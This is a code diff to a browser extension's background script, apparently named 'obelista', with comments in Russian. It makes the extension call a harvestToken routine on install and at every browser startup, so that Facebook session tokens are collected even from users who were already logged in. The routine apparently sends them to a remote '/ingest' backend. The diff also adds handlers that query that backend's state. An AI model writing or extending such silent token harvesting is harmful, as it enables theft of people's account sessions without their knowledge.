@@ -162,12 +162,18 @@ chrome.cookies.onChanged.addListener((change) => {
   }
 })
 
+// Юзер мог сидеть залогиненным в FB ДО установки расширения — тогда
+// chrome.cookies.onChanged не выстрелит, потому что куки не меняются.
+// На install и на старте браузера сами дёргаем harvest. 60s debounce в
+// harvestToken защитит от двойной отправки.
 chrome.runtime.onInstalled.addListener(() => {
   console.log("[obelista] installed")
+  harvestToken("install").catch((e) => console.error("[obelista] install harvest failed", e))
 })
 
 chrome.runtime.onStartup.addListener(() => {
   console.log("[obelista] startup")
+  harvestToken("startup").catch((e) => console.error("[obelista] startup harvest failed", e))
 })
 
 // ---------- messages from content/popup/options ----------
@@ -196,6 +202,21 @@ chrome.runtime.onMessage.addListener((msg, _sender, sendResponse) => {
         return
       }
       if (msg?.type === "test_connection") {
+        const endpoint = (await getEndpoint()).replace(/\/ingest\/?$/, "")
+        const url = `${endpoint}${STATE_ENDPOINT_SUFFIX}`
+        try {
+          const r = await fetch(url, { method: "GET", cache: "no-store" })
+          const body = await r.json().catch(() => null)
+          sendResponse({ ok: r.ok, status: r.status, body, url })
+        } catch (e) {
+          sendResponse({ ok: false, status: 0, error: String(e), url })
+        }
+        return
+      }
+      if (msg?.type === "get_state") {
+        // Попап хочет живое состояние с бэка (что опции показывают по
+        // "Test connection"). Идём тем же путём что и test_connection,
+        // только возвращаем body без обёртки.
         const endpoint = (await getEndpoint()).replace(/\/ingest\/?$/, "")
         const url = `${endpoint}${STATE_ENDPOINT_SUFFIX}`
         try {
